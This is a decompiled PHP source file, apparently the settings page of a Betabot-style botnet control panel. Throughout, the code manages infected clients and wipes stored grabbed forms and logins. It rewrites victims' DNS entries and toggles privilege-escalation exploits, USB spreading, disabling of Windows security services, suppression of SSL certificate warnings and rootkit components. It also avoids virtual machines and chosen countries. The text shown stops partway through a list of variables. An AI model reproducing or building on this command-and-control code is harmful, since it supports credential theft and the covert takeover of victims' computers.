<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

echo "﻿";
if (!defined("IN_INDEX_PAGE")) {
    exit("..");
}
$proactive_value = "checked";
$sqlLogs = new CLogs();
$sqlLogs->SetInternalLink($main_sql_link);
define("MOD_SETTINGS_PANEL_ALERT_WIDTH", 1117);
define("SETTINGS_NOTICE_SUCCESS_OK", "Settings were successfully updated!");
define("SETTINGS_NOTICE_ERROR_NAME_REQUIRED", "A name for this botnet is required. Please enter a name between 1 and 32 characters and try again.");
define("SETTINGS_NOTICE_ERROR_NAME_INVALID", "The name you entered was either too long, too short or contained invalid characters. Please enter a alphanumeric name and try again.");
define("SETTINGS_NOTICE_ERROR_ABSENT_LIMIT_REQUIRED", "You must enter the number of days you want before <i>inactive</i> bots are marked as 'dead'");
define("SETTINGS_NOTICE_ERROR_ABSENT_LIMIT_INVALID", "Invalid inactive bot value. Must be a numeric value from 2 - 90. (Measured in days)");
define("SETTINGS_NOTICE_ERROR_KNOCK_INTERVAL_REQUIRED", "You must enter the number of minutes between each bot knock (update request).");
define("SETTINGS_NOTICE_ERROR_KNOCK_INTERVAL_INVALID", "Invalid bot knock interval. Must be a numeric value from 20 - 9999. (Measured in minutes)");
define("SETTINGS_NOTICE_ERROR_CRYPT_KEY_REQUIRED", "You must enter a encryption key to use for client/server communications.");
define("SETTINGS_NOTICE_ERROR_CRYPT_KEY_INVALID", "Invalid encryption key specified. Must be between 6 - 32 characters long and not contain the backslash character <strong>\\</strong>");
define("SETTINGS_NOTICE_ERROR_SECURE_CODE_INVALID", "Your login page Secure Code must be between 2 - 16 characters and only consist of alphanumeric characters.");
define("SETTINGS_NOTICE_ERROR_IGNORE_LOCALES_INVALID", "The ISO-2 country codes you provided were in the incorrect format. Please provide exactly like this: <i>US, RU, FR</i> ...");
define("SETTINGS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE", "background-color: #FF6633;");
$b_can_change_settings = true;
if (!empty($_POST) && !((int) $Session->Rights() & USER_PRIVILEGES_EDIT_SETTINGS)) {
    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Your account is not allowed to change panel settings.", true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
    $b_can_change_settings = false;
}
if (isset($_GET["clear_events"]) && $_GET["clear_events"] == "true") {
    if ((int) $Session->Rights() & USER_PRIVILEGES_VIEW_LOGS) {
        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully cleared event logs.", true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
        $sqlLogs->ClearLogs();
    }
} else {
    if (!(isset($_POST["save_settings"]) || isset($_POST["default_settings"]))) {
        if (isset($_POST["clear_failed_logins"]) && $b_can_change_settings == true) {
            if ($sqlSettings->Clear_FailedLogins()) {
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully cleared failed logins count.", true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
            } else {
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to clear due to an unknown SQL error.", true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
            }
        } else {
            if (isset($_POST["db_optimize_tables"]) && $b_can_change_settings == true) {
                $ret = $sqlBlacklist->Query("OPTIMIZE TABLE " . SQL_DATABASE . ".clients");
                if ($ret) {
                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully optimized clients table.", true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
                } else {
                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to optimize table due to an unknown SQL error.", true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
                }
            } else {
                if (isset($_POST["db_clear_dead_bots"]) && $b_can_change_settings == true) {
                    $ret = $sqlBlacklist->Query("DELETE FROM " . SQL_DATABASE . ".clients WHERE ClientStatus = '" . BOT_STATUS_DEAD . "'");
                    $sqlBlacklist->Query("DELETE FROM " . SQL_DATABASE . ".clients WHERE ClientStatus = '" . BOT_STATUS_DELETED . "'");
                    if ($ret) {
                        $num_del = @mysql_affected_rows($ret);
                        global $sqlSettings;
                        global $main_sql_link;
                        global $Session;
                        $elogs = new CLogs();
                        $elogs->SetInternalLink($main_sql_link);
                        $elogs->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_DB_WIPED_RECORDS, "All dead bot client records wiped from database");
                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully cleared " . $num_del . " bots marked as 'dead'", true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
                    } else {
                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to clear dead bots due to an unknown SQL error.", true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
                    }
                } else {
                    if (isset($_POST["db_clear_logs"]) && $b_can_change_settings == true) {
                        $ret = $sqlBlacklist->Query("TRUNCATE TABLE " . SQL_DATABASE . ".grabbed_forms");
                        $ret = $sqlBlacklist->Query("TRUNCATE TABLE " . SQL_DATABASE . ".grabbed_logins");
                        if ($ret) {
                            global $sqlSettings;
                            global $main_sql_link;
                            global $Session;
                            $elogs = new CLogs();
                            $elogs->SetInternalLink($main_sql_link);
                            $elogs->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_DB_WIPED_RECORDS, "All grabbed form/login records wiped from database");
                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully cleared client logs.", true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
                        } else {
                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to clear client logs due to an unknown SQL error.", true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
                        }
                    } else {
                        if (isset($_POST["txt_delete_logfile"]) && $b_can_change_settings == true) {
                            if (file_exists(GATE_LOG_FILENAME)) {
                                if (unlink(GATE_LOG_FILENAME)) {
                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully deleted: " . GATE_LOG_FILENAME, true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
                                } else {
                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to delete: " . GATE_LOG_FILENAME, true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
                                }
                            } else {
                                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, GATE_LOG_FILENAME . " was not deleted because it does not exist.", true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
                            }
                        } else {
                            if (isset($_POST["db_clear_clients"]) && $b_can_change_settings == true) {
                                $ret = $sqlBlacklist->Query("TRUNCATE TABLE " . SQL_DATABASE . ".clients");
                                if ($ret) {
                                    global $sqlSettings;
                                    global $main_sql_link;
                                    global $Session;
                                    $elogs = new CLogs();
                                    $elogs->SetInternalLink($main_sql_link);
                                    $elogs->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_DB_WIPED_RECORDS, "All client records wiped from database");
                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully cleared all client records from the database.", true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
                                } else {
                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to clear client records due to an unknown SQL error.", true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
                                }
                            } else {
                                if (isset($_POST["dnslist"]) && isset($_POST["dns_submit"]) && $b_can_change_settings == true) {
                                    $rdata = _obfuscated_0D0535212B06172F35323F060C2B1E13192C140E5B4001_($_POST["dnslist"]);
                                    $rdata = str_replace("\r\n\r\n", "", $rdata);
                                    $is_dns_update_ok = true;
                                    $dns_update_notice = "";
                                    $split_rdata = explode("\n", $rdata);
                                    $dns_list_index = 0;
                                    if (0 < strlen($rdata) && strlen($rdata) < 7) {
                                        $is_dns_update_ok = false;
                                        $dns_update_notice = "Domain/IP list update failed. The provided list is too short.";
                                    }
                                    if ($is_dns_update_ok) {
                                        foreach ($split_rdata as $split_entry) {
                                            $split_entry = str_replace("\r", "", $split_entry);
                                            $dns_list_index++;
                                            $e_len = strlen($split_entry);
                                            if (0 < $e_len && ($e_len < 3 && 0 < $e_len || 256 < $e_len || !strstr($split_entry, ".") || _obfuscated_0D342F2C27372937375B26040619191B5B283836320E22_($split_entry, false) || !strstr($split_entry, " "))) {
                                                $dns_update_notice = "Domain/IP list update failed. Modification entry #" . $dns_list_index . " is invalid: <i>" . $split_entry . "</i>";
                                                $is_dns_update_ok = false;
                                                break;
                                            }
                                            if (3 < strlen($split_entry)) {
                                                $ip_stuff = @strstr($split_entry, " ");
                                                if (strlen($ip_stuff) < 8) {
                                                    $dns_update_notice = "Domain/IP list update failed. Modification entry #" . $dns_list_index . " is invalid: <i>" . $split_entry . "</i>";
                                                    $is_dns_update_ok = false;
                                                    break;
                                                }
                                            }
                                        }
                                    }
                                    if (1024 <= (int) $dns_list_index) {
                                        $dns_update_notice = "Unable to create/update Domain/IP modification list. You have too many records. Please provide less than 1024 records.";
                                        $is_dns_update_ok = false;
                                    }
                                    if ($is_dns_update_ok) {
                                        $dnsfile = @fopen(DNS_MOD_FILE, "w");
                                        if ($dnsfile) {
                                            @fwrite($dnsfile, $rdata);
                                            @fclose($dnsfile);
                                            $objMemCache = new CMemoryCache();
                                            $objMemCache->Initialize();
                                            $MemCacheInitialized = $objMemCache->IsInitialized();
                                            if ($MemCacheInitialized == true) {
                                                $mCache->Set(CACHE_CONFIG_DNS_MODIFIERS, $rdata);
                                            }
                                            $dns_update_notice = "Domain/IP modification list update was successful.";
                                            $sqlSettings->Update_DnsModify_Revision();
                                        } else {
                                            $is_dns_update_ok = false;
                                            $dns_update_notice = "Unable to write new domain/ip list to data file. Please check file/folder permissions and try again.";
                                        }
                                        if ($is_dns_update_ok) {
                                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, $dns_update_notice, true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
                                        }
                                    }
                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, $dns_update_notice, true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
                                } else {
                                    if (isset($_POST["blacklistips"]) && isset($_POST["blacklist_submit"]) && $b_can_change_settings == true) {
                                        $rdata = _obfuscated_0D0535212B06172F35323F060C2B1E13192C140E5B4001_($_POST["blacklistips"]);
                                        $is_blacklist_update_ok = true;
                                        $blacklist_update_notice = "";
                                        $split_rdata = explode("\r\n", $rdata);
                                        $blacklist_index = 0;
                                        if (strlen($rdata) < 3) {
                                            $is_blacklist_update_ok = false;
                                            $blacklist_update_notice = "IP blacklist cleared.";
                                            $sqlBlacklist->ClearList();
                                        } else {
                                            if (strlen($rdata) < 9) {
                                                $is_blacklist_update_ok = false;
                                                $blacklist_update_notice = "IP blacklist update failed. The provided list is too short.";
                                            }
                                        }
                                        if ($is_blacklist_update_ok) {
                                            foreach ($split_rdata as $split_entry) {
                                                $blacklist_index++;
                                                $e_len = strlen($split_entry);
                                                $ip_tok = strtok($split_entry, ":");
                                                $ip_tok = str_replace("\r\n", "", $ip_tok);
                                                $reason_tok = strtok(":");
                                                if (!$ip_tok) {
                                                    continue;
                                                }
                                                if (!$reason_tok || 3 < strlen($reason_tok) || is_numeric($reason_tok) == false) {
                                                    $blacklist_update_notice = "IP Blacklist update failed. Entry #" . $blacklist_index . " contains an invalid reason-code. All codes must be numeric and no longer than 3 digits: <i>" . $split_entry . "</i>";
                                                    $is_blacklist_update_ok = false;
                                                    break;
                                                }
                                                if ($e_len < 9 && 1 < $e_len || 19 < $e_len || !strstr($split_entry, ".") && 1 < $e_len || _obfuscated_0D342F2C27372937375B26040619191B5B283836320E22_($split_entry, true)) {
                                                    $blacklist_update_notice = "IP Blacklist update failed. IP entry #" . $blacklist_index . " is invalid: <i>" . $split_entry . "</i> LEN(" . strlen($split_entry) . ")";
                                                    $is_blacklist_update_ok = false;
                                                    break;
                                                }
                                                if (_obfuscated_0D1B1732043C1D0A02350B211B0C321D0F0D3114390411_($ip_tok) == false) {
                                                    $blacklist_update_notice = "IP Blacklist update failed. The IP in entry #" . $blacklist_index . " is invalid: <i>" . $split_entry . "</i>";
                                                    $is_blacklist_update_ok = false;
                                                    break;
                                                }
                                            }
                                            if ($is_blacklist_update_ok) {
                                                if ($sqlBlacklist->ClearList()) {
                                                    $blacklist_index = 0;
                                                    foreach ($split_rdata as $split_entry) {
                                                        $t_ip = strtok($split_entry, ":");
                                                        $t_reason = strtok(":");
                                                        if (7 < strlen($t_ip)) {
                                                            $sqlBlacklist->AddBlacklistedIP(ip2long($t_ip), $t_reason);
                                                        }
                                                    }
                                                    $blacklist_update_notice = "IP blacklist was successfully updated!";
                                                } else {
                                                    $blacklist_update_notice = "Updated failed. An unknown SQL error occured.";
                                                    $is_blacklist_update_ok = false;
                                                }
                                            }
                                        }
                                        if (0 < strlen($blacklist_update_notice)) {
                                            if ($is_blacklist_update_ok) {
                                                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, $blacklist_update_notice, true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
                                            } else {
                                                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, $blacklist_update_notice, true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
$dns_list_data = @file_get_contents(DNS_MOD_FILE);
$num_dns_entries = 0;
$num_modified_domains = 0;
$num_modified_ips = 0;
$num_domip_entries_left = 0;
$domains_being_modified_string = "";
$ips_being_modified_string = "";
$domip_entries_left_string = "";
if ($dns_list_data != NULL && 2 < @strlen($dns_list_data)) {
    $token_data = explode("\n", $dns_list_data);
    if ($token_data) {
        foreach ($token_data as $token) {
            $num_periods = 0;
            $any_non_ip_chars = false;
            $entry_target = "";
            $entry_parts = explode(" ", $token);
            if (3 < strlen($token) && $entry_parts && 2 <= count($entry_parts)) {
                $num_dns_entries++;
                $entry_target = trim($entry_parts[0]);
                $entry_target = str_replace(".", "", $entry_target);
                $entry_target = str_replace("*", "", $entry_target);
                if (ctype_digit($entry_target)) {
                    $num_modified_ips++;
                } else {
                    $num_modified_domains++;
                }
            }
            if (1024 <= $num_dns_entries) {
                break;
            }
        }
    }
}
if (0 < (int) $num_modified_domains) {
    $domains_being_modified_string = "<font color=\"#339900\">" . $num_modified_domains . "</font>";
} else {
    $domains_being_modified_string = (string) $num_modified_domains;
}
if (0 < (int) $num_modified_ips) {
    $ips_being_modified_string = "<font color=\"#339900\">" . $num_modified_ips . "</font>";
} else {
    $ips_being_modified_string = (string) $num_modified_ips;
}
$num_domip_entries_left = 1024 - $num_dns_entries;
if ((int) $num_domip_entries_left < 32) {
    $domip_entries_left_string = "<font color=\"#E80000\">" . $num_domip_entries_left . "</font>";
} else {
    $domip_entries_left_string = (string) $num_domip_entries_left;
}
$blacklist_data = "";
$bl_entries = $sqlBlacklist->GetAllEntries();
if ($bl_entries) {
    while ($row = mysql_fetch_assoc($bl_entries)) {
        if (isset($row["host"]) && isset($row["reason_id"])) {
            $blacklist_data .= long2ip($row["host"]) . ":" . $row["reason_id"] . "\r\n";
        }
    }
    mysql_free_result($bl_entries);
}
$botnet_name_fix = "";
$absent_limit_fix = "";
$knock_interval_fix = "";
$comms_key_fix = "";
$secure_code_fix = "";
if (isset($_POST["save_settings"]) && $b_can_change_settings == true) {
    $settings_notice = "";
    $bIsIgnoredLocalesOK = true;
    if (isset($_POST["ignore_locales"]) && 0 < strlen($_POST["ignore_locales"])) {
        $no_sep = str_replace(",", "", $_POST["ignore_locales"]);
        $no_sep = str_replace(" ", "", $no_sep);
        $cn_array = explode(",", $_POST["ignore_locales"]);
        if (0 < count($cn_array)) {
            for ($i = 0; $i < count($cn_array); $i++) {
                if (strlen(str_replace(" ", "", $cn_array[$i])) != 2) {
                    $bIsIgnoredLocalesOK = false;
                    break;
                }
            }
        }
        if (strlen($no_sep) < 2 || 32000 < strlen($no_sep)) {
            $bIsIgnoredLocalesOK = false;
        } else {
            if (!ctype_alnum($no_sep)) {
                $bIsIgnoredLocalesOK = false;
            }
        }
    }
    if (!isset($_POST["botnet_name"]) || strlen($_POST["botnet_name"]) < 1) {
        $settings_notice = SETTINGS_NOTICE_ERROR_NAME_REQUIRED;
        $botnet_name_fix = SETTINGS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
    } else {
        if (32 < strlen($_POST["botnet_name"]) || !@ctype_alnum($_POST["botnet_name"])) {
            $settings_notice = SETTINGS_NOTICE_ERROR_NAME_INVALID;
            $botnet_name_fix = SETTINGS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
        } else {
            if (!isset($_POST["absent_limit"]) || strlen($_POST["absent_limit"]) < 1) {
                $settings_notice = SETTINGS_NOTICE_ERROR_ABSENT_LIMIT_REQUIRED;
                $absent_limit_fix = SETTINGS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
            } else {
                if (!is_numeric($_POST["absent_limit"]) || 90 < (int) $_POST["absent_limit"]) {
                    $settings_notice = SETTINGS_NOTICE_ERROR_ABSENT_LIMIT_INVALID;
                    $absent_limit_fix = SETTINGS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                } else {
                    if (!isset($_POST["knock_interval"]) || strlen($_POST["knock_interval"]) < 1) {
                        $settings_notice = SETTINGS_NOTICE_ERROR_KNOCK_INTERVAL_REQUIRED;
                        $knock_interval_fix = SETTINGS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                    } else {
                        if (!is_numeric($_POST["knock_interval"]) || 9999 < (int) $_POST["knock_interval"]) {
                            $settings_notice = SETTINGS_NOTICE_ERROR_KNOCK_INTERVAL_INVALID;
                            $knock_interval_fix = SETTINGS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                        } else {
                            if (isset($_POST["secure_code"]) && 0 < strlen($_POST["secure_code"]) && (!ctype_alnum($_POST["secure_code"]) || 16 < strlen($_POST["secure_code"]))) {
                                $settings_notice = SETTINGS_NOTICE_ERROR_SECURE_CODE_INVALID;
                                $secure_code_fix = SETTINGS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                            } else {
                                if ($bIsIgnoredLocalesOK == false) {
                                    $settings_notice = SETTINGS_NOTICE_ERROR_IGNORE_LOCALES_INVALID;
                                    $ignored_locales_fix = SETTINGS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    if (!strlen($settings_notice)) {
        global $sqlSettings;
        $log_options = 0;
        $newSettings = new CPanelSettings();
        if (!isset($_POST["sel_language"]) || strlen($_POST["sel_language"]) == 0) {
            $newSettings->Language = "english";
        }
        $newSettings->Language = "english";
        $newSettings->Flags_General = 0;
        $newSettings->Flags_Security = 0;
        $newSettings->Flags_Minor = 0;
        if ($sqlSettings->Flags_General & GENERAL_FLAGS_FORMGRAB_DISABLED) {
            $newSettings->Flags_General |= GENERAL_FLAGS_FORMGRAB_DISABLED;
        }
        if (isset($_POST["panel_genoption_noinfograbstats"])) {
            $newSettings->General_Options |= GENERAL_OPTION_DISABLE_MAINPAGE_INDV_GRABS_STATS;
        }
        if (isset($_POST["checkbox_view_minimum_stats"])) {
            $newSettings->General_Options |= GENERAL_OPTION_MAIN_PAGE_VIEW_MINIMUM_STATS;
        }
        if (isset($_POST["checkbox_view_minimum_form_info"])) {
            $newSettings->General_Options |= GENERAL_OPTION_FORM_PAGE_VIEW_MINIMUM_INFO;
        }
        if (isset($_POST["checkbox_no_charts"])) {
            $newSettings->General_Options |= GENERAL_OPTION_MAIN_PAGE_NO_CHARTS;
        }
        if (isset($_POST["panel_genoption_debug_output"])) {
            $newSettings->General_Options |= GENERAL_OPTION_GATE_DEBUG_OUTPUT_ENABLED;
        }
        if (isset($_POST["panel_bot_proactive_toggle"])) {
            $newSettings->Flags_General |= GENERAL_FLAGS_PROACTIVE_DEFENSE_ENABLED;
        }
        if (isset($_POST["panel_miner_proactive_toggle"])) {
            $newSettings->Flags_General |= GENERAL_FLAGS_PROACTIVE_MINER_DEFENSE_ENABLED;
        }
        if (isset($_POST["panel_bot_aggressive_proactive_toggle"])) {
            $newSettings->Flags_General |= GENERAL_FLAGS_AGGRESSIVE_PROACTIVE_DEFENSE_ENABLED;
        }
        if (isset($_POST["panel_bot_use_exploits_toggle"])) {
            $newSettings->Flags_General |= GENERAL_FLAGS_PRIVILEGE_ESCALATION_EXPLOITS_ENABLED;
        }
        if (isset($_POST["panel_betabot_proactive_toggle"])) {
            $newSettings->Flags_General |= GENERAL_FLAGS_PROACTIVE_ANTI_OLDER_BETABOT_ENABLED;
        }
        if (isset($_POST["panel_bot_usb_spread_toggle"])) {
            $newSettings->Flags_General |= GENERAL_FLAGS_USB_SPREAD_ENABLED;
        }
        if (isset($_POST["panel_bot_components_toggle"])) {
            $newSettings->Flags_General |= GENERAL_FLAGS_SYS_INJECTIONS_DISABLED;
        }
        if (isset($_POST["panel_bot_components_browsers_only_toggle"])) {
            $newSettings->Flags_General |= GENERAL_FLAGS_SYS_INJECTIONS_XBROWSER_DISABLED;
        }
        if (isset($_POST["panel_bot_components_anti_bootkit_toggle"])) {
            $newSettings->Flags_General |= GENERAL_FLAGS_ANTI_BOOTKIT_ENABLED;
        }
        if (isset($_POST["panel_bot_force_ie_toggle"])) {
            $newSettings->Flags_General |= GENERAL_FLAGS_FORCE_IE_ENABLED;
        }
        if (isset($_POST["panel_botattrib_no_ieo"])) {
            $newSettings->Flags_Minor |= MINOR_FLAGS_DISABLE_IMAGE_EXECUTION_OPTIONS_FUNC;
        }
        if (isset($_POST["panel_botattrib_no_disable_services"])) {
            $newSettings->Flags_Minor |= MINOR_FLAGS_DO_NOT_DISABLE_WINDOWS_SEC_SERVICES;
        }
        if (isset($_POST["panel_botattrib_disable_autoupdates"])) {
            $newSettings->Flags_Minor |= MINOR_FLAGS_DISABLE_AUTOUPDATES_ADDONS;
        }
        if (isset($_POST["panel_botattrib_disable_lua"])) {
            $newSettings->Flags_Minor |= MINOR_FLAGS_DISABLE_LUA;
        }
        if (isset($_POST["panel_bot_userkit_toggle"])) {
            $newSettings->Flags_General |= GENERAL_FLAGS_USERKIT_DISABLED;
        }
        if (isset($_POST["panel_bot_userkit64_toggle"])) {
            $newSettings->Flags_Minor |= MINOR_FLAGS_DISABLE_USERKIT_64BIT;
        }
        if (isset($_POST["panel_bot_use_runonce"])) {
            $newSettings->Flags_Minor |= MINOR_FLAGS_INSTALL_USE_HKLM_RUNONCE;
        }
        if (isset($_POST["panel_bot_use_shell_folder"])) {
            $newSettings->Flags_Minor |= MINOR_FLAGS_INSTALL_ENABLE_SHELL_FOLDER;
        }
        if (isset($_POST["panel_bot_fg_filter_useless_grabs"])) {
            $newSettings->Flags_Minor |= MINOR_FLAGS_FORMGRAB_FILTER_USELESS_GRABS;
        }
        if (isset($_POST["panel_bot_inj_disable_loader_injection"])) {
            $newSettings->Flags_Minor |= MINOR_FLAGS_DISABLE_INJECT_INTO_LOADERS;
        }
        if (isset($_POST["panel_botattrib_update_on_checkin"])) {
            $newSettings->General_Options |= GENERAL_OPTION_SEND_UPDATE_TASK_ONLY_ON_CHECKIN;
        }
        if (isset($_POST["panel_botattrib_debug_msg_system"])) {
            $newSettings->Flags_Minor |= MINOR_FLAGS_ENABLE_DEBUG_MSG_SYSTEM;
        }
        if (isset($_POST["panel_botattrib_debug_attrib"])) {
            $newSettings->Flags_Minor |= MINOR_FLAGS_ENABLE_DEBUG_ATTRIBUTES;
        }
        $newSettings->Flags_Blobs = 0;
        if (isset($_POST["panel_botattrib_blob_process_list"])) {
            $newSettings->Flags_Blobs |= INFOBLOB_FLAGS_PROCESS_LIST;
        }
        if (isset($_POST["panel_botattrib_blob_software_list"])) {
            $newSettings->Flags_Blobs |= INFOBLOB_FLAGS_INSTALLED_SOFTWARE_LIST;
        }
        if (isset($_POST["panel_botattrib_blob_autostart_list"])) {
            $newSettings->Flags_Blobs |= INFOBLOB_FLAGS_AUTOSTART_LIST;
        }
        if (isset($_POST["panel_botattrib_blob_generic"])) {
            $newSettings->Flags_Blobs |= INFOBLOB_FLAGS_GENERIC_INFO;
        }
        if (isset($_POST["panel_botattrib_blob_debug"])) {
            $newSettings->Flags_Blobs |= INFOBLOB_FLAGS_DEBUG_INFO;
        }
        if (isset($_POST["panel_botattrib_no_ssl_cert_errors"])) {
            $newSettings->Flags_Minor |= MINOR_FLAGS_DISABLE_SSL_CERTIFICATE_WARNINGS;
        }
        if (isset($_POST["blacklist_enable"])) {
            $newSettings->Flags_Security |= SECURITY_FLAGS_BLACKLIST_ENABLED;
        }
        if (isset($_POST["blacklist_suspicious_queries"])) {
            $newSettings->Flags_Security |= SECURITY_FLAGS_BLACKLIST_PROACTIVE_ENABLED;
        }
        if (isset($_POST["security_disable_gateway"])) {
            $newSettings->Flags_Security |= SECURITY_FLAGS_PANEL_GATEWAY_DISABLED;
        }
        if (isset($_POST["blacklist_tor"])) {
            $newSettings->Flags_Security |= SECURITY_FLAGS_PANEL_BLACKLIST_TOR;
        }
        if (isset($_POST["security_disable_vm_contacts"])) {
            $newSettings->Flags_Security |= SECURITY_FLAGS_PANEL_IGNORE_COMMS_VM;
        }
        if (isset($_POST["log_enable"])) {
            $log_options |= EVENT_OPTION_ENABLED;
        }
        if (isset($_POST["log_e_logins"])) {
            $log_options |= EVENT_OPTION_E_LOGINS;
        }
        if (isset($_POST["log_e_settings"])) {
            $log_options |= EVENT_OPTION_E_SETTINGS;
        }
        if (isset($_POST["log_e_tasks"])) {
            $log_options |= EVENT_OPTION_E_TASKS;
        }
        if (isset($_POST["log_e_users"])) {
            $log_options |= EVENT_OPTION_E_USERS;
        }
        if (isset($_POST["log_mask_ips"])) {
            $log_options |= EVENT_OPTION_MASK_IPS;
        }
        if (isset($_POST["log_e_user_modify"])) {
            $log_options |= EVENT_OPTION_E_USER_MODIFIED;
        }
        if (isset($_POST["log_e_task_edit"])) {
            $log_options |= EVENT_OPTION_E_TASK_EDIT;
        }
        if (isset($_POST["log_e_task_delete"])) {
            $log_options |= EVENT_OPTION_E_TASK_DELETE;
        }
        if (isset($_POST["log_e_fg_filters_modify"])) {
            $log_options |= EVENT_OPTION_E_FORMS_MODIFIED_FILTERS;
        }
        if (isset($_POST["log_e_grabber_status"])) {
            $log_options |= EVENT_OPTION_E_GRABBER_STATUS_CHANGED;
        }
        if (isset($_POST["log_e_fs_modify"])) {
            $log_options |= EVENT_OPTION_E_FILE_SEARCH_UPDATED;
        }
        if (isset($_POST["log_e_db_actions"])) {
            $log_options |= EVENT_OPTION_E_DB_WIPED_RECORDS;
        }
        $newSettings->LogOptions = $log_options;
        $newSettings->Name = stripslashes($_POST["botnet_name"]);
        $newSettings->AbsentLimit = (int) $_POST["absent_limit"];
        $newSettings->KnockInterval = (int) $_POST["knock_interval"];
        $newSettings->SecureCode = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($_POST["secure_code"]);
        $newSettings->Ignored_Locales = str_replace(" ", "", $_POST["ignore_locales"]);
        $newSettings->Flags_Custom = CUSTOM_FLAGS_INVALID_FLAGS;
        $sqlSettings->UpdateSettings($newSettings);
        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, SETTINGS_NOTICE_SUCCESS_OK, true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
    } else {
        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, $settings_notice, true, MOD_SETTINGS_PANEL_ALERT_WIDTH);
    }
}
$sqlSettings->GetSettings(true);
$gen_option_noinfograbstats_value = "";
$gen_view_minimum_stats_value = "";
$gen_view_minimum_form_info = "";
$gen_no_charts_value = "";
$gen_option_debug_output_value = "";
$proactive_value = "";
$proactive_miner_value = "";
$proactive_agr_value = "";
$antibetabot_value = "";
$usb_spread_value = "";
$syscomponents_value = "";
$syscomponents_browser_only_value = "";
$anti_ek_value = "";
$anti_bootkit_value = "";
$forceie_value = "";
$use_privesc_exploits_value = "";
$adv_avk_disable_ieo_value = "";
$adv_avk_no_fakewin_value = "";
$adv_avk_no_disable_services_value = "";
$adv_avk_disable_autoupdates_value = "";
$adv_avk_disable_lua_value = "";
$adv_userkit_value = "";
$adv_userkit64_value = "";
$adv_install_use_runonce_value = "";
$adv_install_use_shell_folder = "";
$adv_nosslcertwarnings_value = "";
$adv_panel_update_only_on_checkin_value = "";
$adv_debug_msg_system_value = "";
$adv_debug_attributes_value = "";
$adv_blobs_process_list_value = "";
$adv_blobs_software_list_value = "";
$adv_blobs_autostart_list_value = "";
$adv_blobs_generic_value = "";
$adv_blobs_debug_value = "";
$adv_formgrab_filter_useless_value = "";
$adv_inject_disable_loader_injection = "";
$blacklist_status_value = "";
$blacklist_proactive_value = "";
